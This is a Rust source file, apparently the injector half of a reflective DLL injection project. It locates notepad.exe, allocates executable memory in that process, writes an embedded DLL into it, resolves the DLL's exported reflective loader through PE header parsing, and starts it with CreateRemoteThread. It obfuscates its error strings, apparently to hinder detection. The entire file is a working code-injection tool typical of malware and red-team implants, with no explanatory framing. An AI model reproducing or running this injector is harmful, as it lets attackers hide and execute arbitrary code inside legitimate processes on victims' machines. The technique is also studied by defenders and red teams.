use std::{ptr::null_mut, collections::BTreeMap, ffi::{CStr}, mem::{size_of}};
use windows_sys::Win32::{System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS, CreateRemoteThread}, SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY}, Diagnostics::{Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER}, ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}}, Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx}}, Foundation::{CloseHandle, INVALID_HANDLE_VALUE}};
use obfstr::obfstr;

fn main() {
    env_logger::init();

    let process_id = get_process_id_by_name("notepad.exe").expect("Failed to get process ID");
    log::info!("[+] Process ID: {}", process_id);

    let image_bytes = include_bytes!(r"C:\Users\developer\Documents\GitHub\rdi-rs\reflective_loader\target\release\reflective_loader.dll");
    //let module_size = image_bytes.len();
    let module_base = image_bytes.as_ptr() as usize;
    
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    log::info!("[+] IMAGE_DOS_HEADER: {:?}", dos_header);

    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };
    log::info!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);

    let process_handle = unsafe { 
        OpenProcess(
            PROCESS_ALL_ACCESS,
            0,
            process_id
        )
    };

    if process_handle == 0 {
        panic!("Failed to open a handle to the target process");
    }

    log::info!("[+] Process handle: {:?}", process_handle);

    let remote_image = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };
    
    log::info!("[+] Remote allocated memory region for the dll: {:p}", remote_image);

    if remote_image == null_mut() {
        panic!("Failed to allocate memory in the target process for dll");
    }

    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_image as _,
            image_bytes.as_ptr() as _,
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            null_mut(),
        )
    };

    if wpm_result == 0 {
        panic!("Failed to write the image to the target process");
    }

    let loader_address = get_exports_by_name(module_base as _, "loader".to_owned()).expect("Failed to find export");
    log::info!("[+] Local Reflective Loader Address/offset: {:?}", loader_address);

    let reflective_loader = remote_image as usize + (loader_address as usize - module_base); // module_base minus to get the offset
    log::info!("[+] Remote Reflective Loader Address/offset: {:#x}", reflective_loader);

    let entry_point = unsafe { (*nt_headers).OptionalHeader.AddressOfEntryPoint };
    log::info!("[+] entry_point: {:#x}", remote_image as usize + entry_point as usize);
    //pause();
    
    // Create remote thread and execute our shellcode
    let thread_handle = unsafe { 
        CreateRemoteThread(
        process_handle,
        null_mut(),
        0,
        Some(std::mem::transmute(reflective_loader as usize)),
        remote_image,
        0,
        null_mut(),
        )
    };

    if thread_handle == 0 {
        panic!("Failed to create remote thread");
    }

    unsafe { CloseHandle(thread_handle) };

    log::info!("[+] Injection Completed");

}

/// Gets the process ID by name, take process name as a parameter
fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err(obfstr!("Failed to call CreateToolhelp32Snapshot").to_owned());
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Err(obfstr!("Failed to call Process32First").to_owned());
    }

    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Err(obfstr!("Failed to call Process32Next").to_owned());
        }
    }

    return Ok(process_entry.th32ProcessID);
}
/// Gets exports by name
fn get_exports_by_name(module_base: *mut u8, module_name: String) -> Option<*mut u8> {

    // loop through the module exports to find export by name
    for (name, addr) in unsafe { get_module_exports(module_base) } {
        if name == module_name {
            return Some(addr as _);
        }
    }

    return None;
}

/// Retrieves all function and addresses from the specfied modules
unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();
    
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;

    #[cfg(target_arch = "x86_64")]
    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = rva_to_file_offset_pointer(module_base as usize, 
        (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as u32) as *mut IMAGE_EXPORT_DIRECTORY;
    
    let names = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNames) as *const u32,
        (*export_directory).NumberOfNames as _,
    );
    
    let functions = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfFunctions) as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );
    
    let ordinals = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNameOrdinals) as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    //log::info!("[+] Module Base: {:?} Export Directory: {:?} AddressOfNames: {names:p}, AddressOfFunctions: {functions:p}, AddressOfNameOrdinals: {ordinals:p} ", module_base, export_directory);
    for i in 0..(*export_directory).NumberOfNames {

        let name = rva_to_file_offset_pointer(module_base as usize, names[i as usize]) as *const i8;

        if let Ok(name) = CStr::from_ptr(name).to_str() {
            
            let ordinal = ordinals[i as usize] as usize;

            exports.insert(
                name.to_string(), 
                rva_to_file_offset_pointer(module_base as usize, functions[ordinal])
            );
        }
    }  
    exports
}

unsafe fn rva_to_file_offset_pointer(module_base: usize, mut rva: u32) -> usize {
    
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    
    let ref_nt_headers = &*nt_headers;
    
    let section_header = ((&ref_nt_headers.OptionalHeader as *const _ as usize) 
        + (ref_nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as *mut IMAGE_SECTION_HEADER;
    
    let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
    
    for i in 0..number_of_sections as usize {
        let virt_address = (*section_header.add(i)).VirtualAddress;
        let virt_size = (*section_header.add(i)).Misc.VirtualSize;
        
        if virt_address <= rva && virt_address + virt_size > rva {
            rva -= (*section_header.add(i)).VirtualAddress;
            rva += (*section_header.add(i)).PointerToRawData;
            
            return module_base + rva as usize;
        }
    }
    return 0;
}

/// Converts a C null terminated String to a Rust String
pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}